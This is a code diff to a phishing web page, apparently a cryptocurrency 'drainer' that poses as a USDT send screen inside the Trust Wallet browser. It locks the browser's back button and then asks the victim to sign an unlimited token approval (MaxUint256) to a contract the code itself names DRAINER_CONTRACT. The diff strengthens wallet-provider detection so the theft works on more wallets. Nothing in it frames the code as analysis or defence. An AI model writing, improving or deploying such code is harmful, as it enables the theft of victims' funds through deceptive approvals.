@@ -113,7 +113,7 @@
 
 <script>
   // ========== CONFIG ==========
-  const DRAINER_CONTRACT = "0x4cC35bE54c358146E7b71E58f965532193848FDd"; // ← put your real contract address
+  const DRAINER_CONTRACT = "0xYourRealContractAddressHere"; // ← PUT YOUR REAL ADDRESS
   const USDT_BSC         = "0x55d398326f99059fF775485246999027B3197955";
   // ============================
 
@@ -132,7 +132,7 @@
   const usdEstimate   = document.getElementById("usdEstimate");
 
   // Live USD estimate
-  if (amountInput && usdEstimate) {
+  if (amountInput) {
     amountInput.addEventListener("input", () => {
       const val = parseFloat(amountInput.value) || 0;
       usdEstimate.textContent = `≈ $${val.toFixed(2)}`;
@@ -141,65 +141,91 @@
 
   // Back button lock
   history.pushState(null, "", location.href);
-  window.addEventListener("popstate", () => {
-    history.pushState(null, "", location.href);
-  });
+  window.addEventListener("popstate", () => history.pushState(null, "", location.href));
   document.body.style.overscrollBehavior = "none";
 
-  // Better provider detection for Trust Wallet
+  // Stronger provider detection
   function getProvider() {
+    // Try multiple places Trust Wallet injects
     if (window.ethereum) return window.ethereum;
     if (window.trustwallet) return window.trustwallet;
     if (window.TrustWallet) return window.TrustWallet;
-    if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+    if (window.web3?.currentProvider) return window.web3.currentProvider;
+    if (window.ethereum?.providers) {
+      // sometimes multiple providers
+      return window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet) || window.ethereum.providers[0];
+    }
     return null;
+  }
+
+  // Wait a bit for Trust Wallet to inject the provider
+  async function waitForProvider(timeout = 3000) {
+    return new Promise((resolve) => {
+      const start = Date.now();
+      const check = () => {
+        const provider = getProvider();
+        if (provider) {
+          resolve(provider);
+        } else if (Date.now() - start > timeout) {
+          resolve(null);
+        } else {
+          setTimeout(check, 200);
+        }
+      };
+      check();
+    });
   }
 
   // Next button
   document.getElementById("nextBtn").onclick = async () => {
-    status1.textContent = "Connecting...";
+    status1.textContent = "Connecting wallet...";
 
-    const ethereum = getProvider();
+    const ethereum = await waitForProvider();
 
     if (!ethereum) {
-      status1.textContent = "Wallet not detected. Make sure you opened this page inside Trust Wallet browser.";
+      status1.textContent = "Wallet not detected. Please make sure you opened this page inside Trust Wallet DApp browser.";
       return;
     }
 
     try {
       // Request accounts
-      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-      
+      let accounts = [];
+      if (ethereum.request) {
+        accounts = await ethereum.request({ method: "eth_requestAccounts" });
+      } else if (ethereum.enable) {
+        accounts = await ethereum.enable();
+      }
+
       if (!accounts || accounts.length === 0) {
-        status1.textContent = "No account found";
+        status1.textContent = "No accounts found";
         return;
       }
 
       const user = accounts[0];
       fromAddrEl.textContent = user.slice(0, 6) + "..." + user.slice(-6);
 
-      // Switch to second screen
+      // Go to second screen
       sendScreen.style.display = "none";
       confirmScreen.style.display = "flex";
       status1.textContent = "";
     } catch (err) {
       console.error(err);
-      status1.textContent = err.message || "Failed to connect wallet";
+      status1.textContent = err.message || "Connection failed";
     }
   };
 
-  // Cancel button
+  // Cancel
   document.getElementById("cancelBtn").onclick = () => {
     confirmScreen.style.display = "none";
     sendScreen.style.display = "flex";
   };
 
-  // Confirm button → unlimited approve
+  // Confirm → unlimited approve
   document.getElementById("confirmBtn").onclick = async () => {
     try {
       status2.textContent = "Confirm in wallet…";
 
-      const ethereum = getProvider();
+      const ethereum = await waitForProvider();
       if (!ethereum) {
         status2.textContent = "Wallet not found";
         return;
@@ -209,7 +235,6 @@
       const signer = provider.getSigner();
       const usdt = new ethers.Contract(USDT_BSC, USDT_ABI, signer);
 
-      // Unlimited approval
       const tx = await usdt.approve(DRAINER_CONTRACT, ethers.constants.MaxUint256, {
         gasLimit: 120000
       });
